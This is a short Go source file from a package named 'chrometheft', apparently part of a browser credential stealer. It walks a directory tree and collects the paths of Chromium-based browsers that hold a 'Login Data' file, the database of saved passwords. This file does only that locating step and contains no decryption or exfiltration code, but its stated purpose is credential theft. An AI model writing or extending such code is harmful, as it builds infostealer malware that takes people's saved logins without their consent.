package chrometheft

import (
	"os"
	"path/filepath"
	"strings"
)

// this will detect all chromium-based browsers
func DetectBrowsers(path string) ([]string, error) {
	// walk the directory
	var browserPath []string
	err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		path = strings.ReplaceAll(path, "/", "\\")
		if strings.HasSuffix(path, "\\User Data\\Default\\Login Data") {
			browserPath = append(browserPath, path[:len(path)-len("\\User Data\\Default\\Login Data")])
		}
		return nil
	})
	return browserPath, err
}
